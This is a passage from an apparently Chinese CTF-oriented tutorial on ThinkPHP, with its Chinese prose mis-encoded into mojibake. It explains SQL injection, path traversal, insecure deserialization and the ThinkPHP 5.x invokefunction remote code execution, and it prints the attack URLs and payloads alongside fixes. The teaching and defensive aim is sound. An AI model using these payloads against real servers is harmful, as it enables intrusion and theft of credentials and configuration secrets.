class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="æ—¥å¿—è®°å½•"><a href="#æ—¥å¿—è®°å½•" class="headerlink" title="æ—¥å¿—è®°å½•"></a>æ—¥å¿—è®°å½•</h4><p>æ—¥å¿—è®°å½•å¯ä»¥å¸®åŠ©å¼€å‘è€…è·Ÿè¸ªç³»ç»Ÿä¸­çš„å¼‚å¸¸ä¸è°ƒè¯•ä¿¡æ¯ã€‚æ—¥å¿—æ–‡ä»¶ä¿å­˜åœ¨ <code>runtime/log/</code> ç›®å½•ä¸­ã€‚</p><ol><li>åœ¨æ§åˆ¶å™¨ä¸­è®°å½•æ—¥å¿—ï¼š</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Log</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title class_">Log</span>::<span class="hljs-title function_ invoke__">record</span>(<span class="hljs-string">&#x27;è¿™æ˜¯ä¸€ä¸ªè°ƒè¯•ä¿¡æ¯&#x27;</span>, <span class="hljs-string">&#x27;debug&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;æ—¥å¿—å·²è®°å½•&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>æŸ¥çœ‹æ—¥å¿—ï¼šæ—¥å¿—æ–‡ä»¶ä¼šä¿å­˜åœ¨ <code>runtime/log/</code> ç›®å½•ä¸‹ã€‚</li></ol><hr><h3 id="éƒ¨ç½²"><a href="#éƒ¨ç½²" class="headerlink" title="éƒ¨ç½²"></a>éƒ¨ç½²</h3><h4 id="é…ç½®ç¯å¢ƒ"><a href="#é…ç½®ç¯å¢ƒ" class="headerlink" title="é…ç½®ç¯å¢ƒ"></a>é…ç½®ç¯å¢ƒ</h4><p>åœ¨éƒ¨ç½²ä¹‹å‰ï¼Œç¡®ä¿é…ç½®å¥½ä¸åŒçš„ç¯å¢ƒå‚æ•°ï¼Œæ¯”å¦‚æ•°æ®åº“è¿æ¥ã€è°ƒè¯•æ¨¡å¼ç­‰ã€‚</p><ol><li>ä¿®æ”¹ <code>.env</code> æ–‡ä»¶ï¼Œé…ç½®ç”Ÿäº§ç¯å¢ƒå‚æ•°ï¼š</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs env">APP_DEBUG = false<br>DB_HOST = 127.0.0.1<br>DB_NAME = production_db<br>DB_USER = prod_user<br>DB_PASS = prod_pass<br></code></pre></td></tr></table></figure><h4 id="é…ç½®-Web-æœåŠ¡å™¨"><a href="#é…ç½®-Web-æœåŠ¡å™¨" class="headerlink" title="é…ç½® Web æœåŠ¡å™¨"></a>é…ç½® Web æœåŠ¡å™¨</h4><p>ThinkPHP é¡¹ç›®éœ€è¦éƒ¨ç½²åœ¨ Web æœåŠ¡å™¨ä¸Šï¼Œå¦‚ <strong>Apache</strong> æˆ– <strong>Nginx</strong>ã€‚</p><p><strong>Nginx é…ç½®ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span> yourdomain.com<br></code></pre></td></tr></table></figure><h3 id="ThinkPHP-æ¡†æ¶æ¶æ„ä¸åŸºç¡€æ¦‚å¿µ"><a href="#ThinkPHP-æ¡†æ¶æ¶æ„ä¸åŸºç¡€æ¦‚å¿µ" class="headerlink" title="ThinkPHP æ¡†æ¶æ¶æ„ä¸åŸºç¡€æ¦‚å¿µ"></a>ThinkPHP æ¡†æ¶æ¶æ„ä¸åŸºç¡€æ¦‚å¿µ</h3><p>ThinkPHP æ˜¯ä¸€ä¸ªåŸºäº MVCï¼ˆModel-View-Controllerï¼‰æ¨¡å¼çš„ PHP æ¡†æ¶ã€‚å…¶æ ¸å¿ƒæ¦‚å¿µå¦‚ä¸‹ï¼š</p><ul><li><strong>Modelï¼ˆæ¨¡å‹ï¼‰</strong>ï¼šè´Ÿè´£ä¸æ•°æ®åº“äº¤äº’ï¼Œæ‰§è¡Œæ•°æ®çš„å¢åˆ æ”¹æŸ¥æ“ä½œã€‚</li><li><strong>Viewï¼ˆè§†å›¾ï¼‰</strong>ï¼šè´Ÿè´£å±•ç¤ºæ•°æ®ï¼Œå¹¶å°†ç»“æœè¾“å‡ºç»™ç”¨æˆ·ã€‚</li><li><strong>Controllerï¼ˆæ§åˆ¶å™¨ï¼‰</strong>ï¼šè´Ÿè´£é€»è¾‘å¤„ç†ï¼Œåè°ƒæ¨¡å‹å’Œè§†å›¾çš„äº¤äº’ã€‚</li></ul><h4 id="1-è·¯ç”±æœºåˆ¶"><a href="#1-è·¯ç”±æœºåˆ¶" class="headerlink" title="1. è·¯ç”±æœºåˆ¶"></a>1. è·¯ç”±æœºåˆ¶</h4><p>ThinkPHP çš„è·¯ç”±æœºåˆ¶å†³å®šäº† URL å¦‚ä½•æ˜ å°„åˆ°å…·ä½“çš„æ§åˆ¶å™¨å’Œæ“ä½œã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒThinkPHP é€šè¿‡ URL çš„è·¯å¾„ç»“æ„æ¥å†³å®šåŠ è½½å“ªä¸ªæ§åˆ¶å™¨å’Œæ–¹æ³•ã€‚ä¾‹å¦‚ï¼Œ<code>index.php?m=module&amp;a=action</code> å°†ä¼šè°ƒç”¨ <code>module</code> æ¨¡å—ä¸‹çš„ <code>action</code> æ–¹æ³•ã€‚</p><p>å¦‚æœä¸å½“å¤„ç† URL åŠå…¶å‚æ•°ï¼Œå¯èƒ½ä¼šå¯¼è‡´è·¯å¾„éå†ã€SQL æ³¨å…¥å’Œè¿œç¨‹ä»£ç æ‰§è¡Œç­‰å®‰å…¨é—®é¢˜ã€‚</p><hr><h3 id="ThinkPHP-å¸¸è§çš„å®‰å…¨æ¼æ´"><a href="#ThinkPHP-å¸¸è§çš„å®‰å…¨æ¼æ´" class="headerlink" title="ThinkPHP å¸¸è§çš„å®‰å…¨æ¼æ´"></a>ThinkPHP å¸¸è§çš„å®‰å…¨æ¼æ´</h3><p>åœ¨ CTF æ¯”èµ›ä¸­ï¼ŒThinkPHP çš„æ¼æ´ä¸»è¦é›†ä¸­åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š</p><h4 id="1-SQL-æ³¨å…¥æ¼æ´"><a href="#1-SQL-æ³¨å…¥æ¼æ´" class="headerlink" title="1.SQL æ³¨å…¥æ¼æ´"></a>1.SQL æ³¨å…¥æ¼æ´</h4><p>SQL æ³¨å…¥æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„è¾“å…¥ï¼Œç ´ååº”ç”¨ç¨‹åºæ‰§è¡Œçš„ SQL æŸ¥è¯¢ã€‚è™½ç„¶ ThinkPHP æä¾›äº† ORM å’Œé¢„å¤„ç†æœºåˆ¶ï¼Œé¿å…ç›´æ¥æ‹¼æ¥ SQL è¯­å¥ï¼Œä½†æ˜¯å¦‚æœå¼€å‘è€…ç›´æ¥ä½¿ç”¨åŸç”Ÿ SQL æŸ¥è¯¢ä¸”æœªåšé€‚å½“çš„è¿‡æ»¤ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘ SQL æ³¨å…¥ã€‚</p><p><strong>æ¼æ´ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// ä¸å®‰å…¨çš„ SQL æŸ¥è¯¢</span><br><span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">M</span>(<span class="hljs-string">&#x27;User&#x27;</span>);<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;SELECT * FROM users WHERE id = &quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œ<code>$_GET[&#39;id&#39;]</code> çš„å€¼æœªç»è¿‡æ»¤å°±è¢«æ’å…¥åˆ°äº† SQL æŸ¥è¯¢ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ å¦‚ä¸‹ URL è¿›è¡Œ SQL æ³¨å…¥ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">index.php?<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">OR</span> <span class="hljs-attribute">1</span>=1 --<br></code></pre></td></tr></table></figure><p><strong>ä¿®å¤æ–¹æ³•</strong>ï¼š</p><ul><li>ä½¿ç”¨æ¡†æ¶æä¾›çš„ ORMï¼š<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])-&gt;<span class="hljs-title function_ invoke__">select</span>();<br></code></pre></td></tr></table></figure></li><li>æˆ–è€…ä½¿ç”¨ PDO è¿›è¡Œå‚æ•°åŒ–æŸ¥è¯¢ï¼Œé¿å… SQL æ³¨å…¥ã€‚</li></ul><h4 id="2-è·¯å¾„éå†æ¼æ´"><a href="#2-è·¯å¾„éå†æ¼æ´" class="headerlink" title="2.è·¯å¾„éå†æ¼æ´"></a>2.è·¯å¾„éå†æ¼æ´</h4><p>è·¯å¾„éå†æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡æ“çºµæ–‡ä»¶è·¯å¾„çš„è¾“å…¥ï¼Œè®¿é—®æœåŠ¡å™¨ä¸Šæœªç»æˆæƒçš„æ–‡ä»¶ã€‚ThinkPHP çš„è·¯ç”±æœºåˆ¶åœ¨å¤„ç†ä¸å½“è¾“å…¥æ—¶ï¼Œå¯èƒ½å¯¼è‡´æ–‡ä»¶åŒ…å«å’Œè·¯å¾„éå†æ¼æ´ã€‚</p><p><strong>æ¼æ´ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// ä¸å®‰å…¨çš„æ–‡ä»¶åŠ è½½</span><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] . <span class="hljs-string">&#x27;.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ å¦‚ä¸‹ URL æ¥è¯»å–ç³»ç»Ÿçš„æ•æ„Ÿæ–‡ä»¶ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?page=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure><p><strong>é˜²å¾¡æªæ–½</strong>ï¼š</p><ul><li>ä¸¥æ ¼é™åˆ¶è¾“å…¥çš„æ–‡ä»¶è·¯å¾„ï¼Œä½¿ç”¨ <code>realpath()</code> ç­‰å‡½æ•°æ ¡éªŒè·¯å¾„æ˜¯å¦åˆæ³•ã€‚</li><li>ä½¿ç”¨ç™½åå•æœºåˆ¶ï¼Œåªå…è®¸åŠ è½½ç‰¹å®šçš„æ–‡ä»¶ã€‚</li></ul><h4 id="3-è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰"><a href="#3-è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰" class="headerlink" title="3 .è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰"></a>3 .è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰</h4><p>ThinkPHP çš„æŸäº›ç‰ˆæœ¬å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„è¯·æ±‚æ‰§è¡Œä»»æ„ä»£ç ã€‚åœ¨ ThinkPHP 5.x ç³»åˆ—ä¸­ï¼ŒæŸäº›ç‰ˆæœ¬å…è®¸è°ƒç”¨ PHP å‡½æ•°ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è°ƒç”¨ <code>call_user_func_array</code> ç­‰å‡½æ•°æ¥æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚</p><p><strong>æ¼æ´ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">index.php?s=index/\think\app/invokefunction&amp;<span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">call_user_func_array</span>&amp;<span class="hljs-title">vars</span>[0]=<span class="hljs-title">system</span>&amp;<span class="hljs-title">vars</span>[1][]=<span class="hljs-title">whoami</span></span><br></code></pre></td></tr></table></figure><p>è¯¥æ¼æ´åˆ©ç”¨æ¡†æ¶çš„å†…éƒ¨è°ƒç”¨æœºåˆ¶ï¼Œè°ƒç”¨ <code>system</code> å‡½æ•°æ‰§è¡Œå‘½ä»¤ <code>whoami</code>ï¼Œè¿”å›æœåŠ¡å™¨çš„ç”¨æˆ·ä¿¡æ¯ã€‚</p><h5 id="å—å½±å“ç‰ˆæœ¬ï¼š"><a href="#å—å½±å“ç‰ˆæœ¬ï¼š" class="headerlink" title="å—å½±å“ç‰ˆæœ¬ï¼š"></a>å—å½±å“ç‰ˆæœ¬ï¼š</h5><ul><li>ThinkPHP 5.0.23 åŠå…¶ä¹‹å‰ç‰ˆæœ¬</li><li>ThinkPHP 5.1.31 åŠå…¶ä¹‹å‰ç‰ˆæœ¬</li></ul><p><strong>é˜²å¾¡æªæ–½</strong>ï¼š</p><ul><li>æ›´æ–°è‡³æœ€æ–°çš„å®‰å…¨ç‰ˆæœ¬ï¼ŒåŠæ—¶ä¿®è¡¥å·²çŸ¥æ¼æ´ã€‚</li><li>å¯¹æ‰€æœ‰ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ï¼Œç‰¹åˆ«æ˜¯ä¸å‡½æ•°è°ƒç”¨ç›¸å…³çš„è¾“å…¥ã€‚</li><li>ç¦æ­¢é€šè¿‡ URL ç›´æ¥è°ƒç”¨æ•æ„Ÿçš„ PHP å‡½æ•°ï¼Œå¦‚ <code>eval</code>ã€<code>system</code>ã€‚</li></ul><h4 id="4-ååºåˆ—åŒ–æ¼æ´"><a href="#4-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="4 .ååºåˆ—åŒ–æ¼æ´"></a>4 .ååºåˆ—åŒ–æ¼æ´</h4><p>ååºåˆ—åŒ–æ¼æ´é€šå¸¸å‡ºç°åœ¨ä½¿ç”¨åºåˆ—åŒ–æœºåˆ¶å­˜å‚¨æˆ–ä¼ é€’æ•°æ®çš„åœºæ™¯ä¸­ã€‚å¦‚æœç”¨æˆ·æä¾›çš„æ•°æ®æœªç»éªŒè¯å°±è¢«ååºåˆ—åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„åºåˆ—åŒ–æ•°æ®ï¼Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><p><strong>æ¼æ´ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ“ä½œ</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>æ”»å‡»è€…å¯ä»¥ä¼ é€’æ¶æ„çš„åºåˆ—åŒ–æ•°æ®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;exec&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>é€šè¿‡è¯¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–åçš„å¯¹è±¡å®ç°ä»£ç æ‰§è¡Œã€‚</p><p><strong>é˜²å¾¡æªæ–½</strong>ï¼š</p><ul><li>é¿å…ç›´æ¥ååºåˆ—åŒ–ä¸å¯ä¿¡çš„æ•°æ®ã€‚</li><li>ä½¿ç”¨å®‰å…¨çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ–¹æ³•ï¼Œå¦‚ JSON ç¼–ç å’Œè§£ç ã€‚</li><li>å¦‚æœå¿…é¡»ä½¿ç”¨ PHP çš„ååºåˆ—åŒ–æœºåˆ¶ï¼Œå»ºè®®å¯¹è¾“å…¥æ•°æ®è¿›è¡Œä¸¥æ ¼æ ¡éªŒã€‚</li></ul><hr><h3 id="ThinkPHP-æ¼æ´åˆ©ç”¨æ–¹æ³•"><a href="#ThinkPHP-æ¼æ´åˆ©ç”¨æ–¹æ³•" class="headerlink" title="ThinkPHP æ¼æ´åˆ©ç”¨æ–¹æ³•"></a>ThinkPHP æ¼æ´åˆ©ç”¨æ–¹æ³•</h3><p>åœ¨ CTF æ¯”èµ›ä¸­ï¼ŒThinkPHP ç›¸å…³é¢˜ç›®é€šå¸¸ä¼šåŒ…å« SQL æ³¨å…¥ã€è·¯å¾„éå†ã€ååºåˆ—åŒ–å’Œ RCE æ¼æ´ã€‚ä»¥ä¸‹æ˜¯å‡ ç§å¸¸è§çš„æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š</p><h4 id="1-SQL-æ³¨å…¥æ”»å‡»"><a href="#1-SQL-æ³¨å…¥æ”»å‡»" class="headerlink" title="1. SQL æ³¨å…¥æ”»å‡»"></a>1. SQL æ³¨å…¥æ”»å‡»</h4><p>é€šè¿‡åœ¨ URL æˆ–è¡¨å•ä¸­æ³¨å…¥æ¶æ„çš„ SQL è¯­å¥ï¼Œæ”»å‡»è€…å¯ä»¥æ“æ§æŸ¥è¯¢ç»“æœã€‚</p><ul><li>ç¤ºä¾‹æ”»å‡» URLï¼š<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?id=<span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> users<br></code></pre></td></tr></table></figure></li></ul><p>æ­¤æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥è·å¾—æ•°æ®åº“ä¸­ç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç ã€‚</p><h4 id="2-è¿œç¨‹ä»£ç æ‰§è¡Œæ”»å‡»"><a href="#2-è¿œç¨‹ä»£ç æ‰§è¡Œæ”»å‡»" class="headerlink" title="2. è¿œç¨‹ä»£ç æ‰§è¡Œæ”»å‡»"></a>2. è¿œç¨‹ä»£ç æ‰§è¡Œæ”»å‡»</h4><p>é’ˆå¯¹ ThinkPHP 5.x ä¸­çš„ RCE æ¼æ´ï¼Œå¯ä»¥æ„é€ å¦‚ä¸‹ URL æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">index.php?s=index/\think\app/invokefunction&amp;<span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">call_user_func_array</span>&amp;<span class="hljs-title">vars</span>[0]=<span class="hljs-title">system</span>&amp;<span class="hljs-title">vars</span>[1][]=<span class="hljs-title">id</span></span><br></code></pre></td></tr></table></figure><p>å¯ä»¥å°† <code>system</code> æ›¿æ¢ä¸ºå…¶ä»–å‡½æ•°ï¼Œå¦‚ <code>exec</code>ã€<code>shell_exec</code> ç­‰ï¼Œæ‰§è¡Œä¸åŒçš„å‘½ä»¤ã€‚</p><h4 id="3-è·¯å¾„éå†æ”»å‡»"><a href="#3-è·¯å¾„éå†æ”»å‡»" class="headerlink" title="3.è·¯å¾„éå†æ”»å‡»"></a>3.è·¯å¾„éå†æ”»å‡»</h4><p>æ”»å‡»è€…é€šè¿‡è·¯å¾„éå†æ¼æ´ï¼Œè·å–ç³»ç»Ÿä¸­çš„æ•æ„Ÿæ–‡ä»¶æˆ–é…ç½®æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œè®¿é—® <code>.env</code> æ–‡ä»¶ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?s=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>config/.env<br></code></pre></td></tr></table></figure><p>è¿™ç§æ”»å‡»å¯èƒ½æ³„éœ²æ•°æ®åº“è¿æ¥ä¿¡æ¯ï¼Œè¿›ä¸€æ­¥å¯¼è‡´æ›´ä¸¥é‡çš„åæœã€‚</p><h4 id="4-ååºåˆ—åŒ–æ”»å‡»"><a href="#4-ååºåˆ—åŒ–æ”»å‡»" class="headerlink" title="4. ååºåˆ—åŒ–æ”»å‡»"></a>4. ååºåˆ—åŒ–æ”»å‡»</h4><p>æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„åºåˆ—åŒ–æ•°æ®ï¼Œåˆ©ç”¨ååºåˆ—åŒ–æ¼æ´è¿›è¡Œæ”»å‡»ã€‚å¯ä»¥é€šè¿‡å‘é€ç‰¹å®šçš„ POST è¯·æ±‚æ¥ä¼ é€’æ¶æ„çš„å¯¹è±¡æ•°æ®ï¼Œå¹¶å®ç°ä»£ç æ‰§è¡Œã€‚</p><hr><h3 id="ThinkPHP-å®‰å…¨é˜²å¾¡æªæ–½"><a href="#ThinkPHP-å®‰å…¨é˜²å¾¡æªæ–½" class="headerlink" title="ThinkPHP å®‰å…¨é˜²å¾¡æªæ–½"></a>ThinkPHP å®‰å…¨é˜²å¾¡æªæ–½</h3><p>ä¸ºé˜²æ­¢ ThinkPHP åº”ç”¨ç¨‹åºè¢«æ”»å‡»ï¼Œå¯ä»¥é‡‡å–ä»¥ä¸‹é˜²å¾¡æªæ–½ï¼š</p><ol><li><p><strong>åŠæ—¶æ›´æ–°æ¡†æ¶</strong>ï¼šä¿æŒ ThinkPHP æ¡†æ¶çš„æœ€æ–°ç‰ˆæœ¬ï¼Œä¿®è¡¥å·²çŸ¥æ¼æ´ã€‚å°¤å…¶æ˜¯å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´çš„ ThinkPHP 5.x ç³»åˆ—ï¼Œå»ºè®®åŠæ—¶æ›´æ–°è‡³æœ€æ–°ç‰ˆæœ¬ã€‚</p></li><li><p><strong>è¾“å…¥è¿‡æ»¤</strong>ï¼šå¯¹æ‰€æœ‰ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤å’Œæ ¡éªŒï¼Œå°¤å…¶æ˜¯ URL å‚æ•°å’Œ POST æ•°æ®ï¼Œé˜²æ­¢æ³¨å…¥å’Œè·¯å¾„éå†æ”»å‡»ã€‚</p></li><li><p><strong>ä½¿ç”¨ ORM æˆ–å‚æ•°åŒ–æŸ¥è¯¢</strong>ï¼šé¿å…ç›´æ¥æ‹¼æ¥ SQL æŸ¥è¯¢ï¼Œä½¿ç”¨æ¡†æ¶çš„ ORM æˆ–è€… PDO æä¾›çš„å‚æ•°åŒ–æŸ¥è¯¢åŠŸèƒ½ï¼Œé˜²æ­¢ SQL æ³¨å…¥ã€‚</p></li><li><p><strong>å…³é—­è°ƒè¯•æ¨¡å¼</strong>ï¼šç”Ÿäº§ç¯å¢ƒä¸­åº”å…³é—­è°ƒè¯•æ¨¡å¼ï¼Œé˜²æ­¢æš´éœ²æ•æ„Ÿçš„è°ƒè¯•ä¿¡æ¯ã€‚å¯ä»¥é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶ä¸­çš„ <code>APP_DEBUG</code> è®¾ç½®å…³é—­è°ƒè¯•ã€‚</p></li><li><p><strong>ä½¿ç”¨ Web åº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰</strong>ï¼šåœ¨æœåŠ¡å™¨å‰ç«¯éƒ¨ç½² WAFï¼Œé˜²æ­¢å¸¸è§çš„ Web æ”»å‡»ï¼Œå¦‚ SQL æ³¨å…¥ã€XSS å’Œ RCE ç­‰ã€‚</p></li><li><p><strong>è·¯å¾„å®‰å…¨</strong>ï¼šå¯¹äºæ–‡ä»¶è·¯å¾„æ“ä½œï¼Œä½¿ç”¨ <code>realpath()</code> æˆ–è€…å…¶ä»–æ–¹æ³•ç¡®ä¿è·¯å¾„åˆæ³•ï¼Œé¿å…è·¯å¾„éå†æ”»å‡»ã€‚</p></li><li><p><strong>ååºåˆ—åŒ–é˜²å¾¡</strong>ï¼šå°½é‡é¿å…ååºåˆ—åŒ–ç”¨æˆ·æä¾›çš„æ•°æ®ã€‚å¦‚æœå¿…é¡»ä½¿ç”¨ååºåˆ—åŒ–ï¼Œç¡®ä¿å¯¹æ•°æ®è¿›è¡Œä¸¥æ ¼æ ¡éªŒï¼Œå¹¶é™åˆ¶å¯ä»¥è¢«åºåˆ—åŒ–çš„ç±»ã€‚</p></li></ol><hr><h3 id="ç‰ˆæœ¬å†å²ä¸æ¼æ´æ€»ç»“"><a href="#ç‰ˆæœ¬å†å²ä¸æ¼æ´æ€»ç»“" class="headerlink" title="ç‰ˆæœ¬å†å²ä¸æ¼æ´æ€»ç»“"></a>ç‰ˆæœ¬å†å²ä¸æ¼æ´æ€»ç»“</h3><p><strong>ThinkPHP 5.x æ¼æ´å†å²</strong>ï¼š</p><ul><li><strong>CVE-2018-20062</strong>ï¼šè¯¥æ¼æ´å…è®¸é€šè¿‡ URL è°ƒç”¨ä»»æ„å‡½æ•°ï¼Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</li><li><strong>CVE-2019-9082</strong>ï¼šæ­¤æ¼æ´å­˜åœ¨äº ThinkPHP 5.x ç³»åˆ—ï¼Œé€šè¿‡è·¯å¾„æ„é€ å¯ä»¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</li></ul><p><strong>ThinkPHP 3.x æ¼æ´å†å²</strong>ï¼š</p><ul><li><strong>è·¯å¾„éå†æ¼æ´</strong>ï¼šæ”»å‡»</li></ul><p>è€…å¯ä»¥é€šè¿‡ä¸å®‰å…¨çš„è·¯å¾„è¾“å…¥è¯»å–ç³»ç»Ÿæ•æ„Ÿæ–‡ä»¶ã€‚</p><ul><li><strong>ååºåˆ—åŒ–æ¼æ´</strong>ï¼šæœªå®‰å…¨å¤„ç†ååºåˆ—åŒ–æ•°æ®ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</li></ul><hr><h3 id="CTF-é¢˜ç›®ä¸­çš„-ThinkPHP-æ¼æ´æ€»ç»“"><a href="#CTF-é¢˜ç›®ä¸­çš„-ThinkPHP-æ¼æ´æ€»ç»“" class="headerlink" title="CTF é¢˜ç›®ä¸­çš„ ThinkPHP æ¼æ´æ€»ç»“"></a>CTF é¢˜ç›®ä¸­çš„ ThinkPHP æ¼æ´æ€»ç»“</h3><p>åœ¨ CTF ä¸­ï¼Œå¸¸è§çš„ ThinkPHP ç›¸å…³é¢˜ç›®æ¼æ´æœ‰ä»¥ä¸‹å‡ ç±»ï¼š</p><ol><li><strong>SQL æ³¨å…¥</strong>ï¼šåˆ©ç”¨ä¸å®‰å…¨çš„ SQL æŸ¥è¯¢è¿›è¡Œæ³¨å…¥æ“ä½œã€‚</li><li><strong>è¿œç¨‹ä»£ç æ‰§è¡Œ</strong>ï¼šé€šè¿‡æ„é€ ç‰¹æ®Šçš„ URL 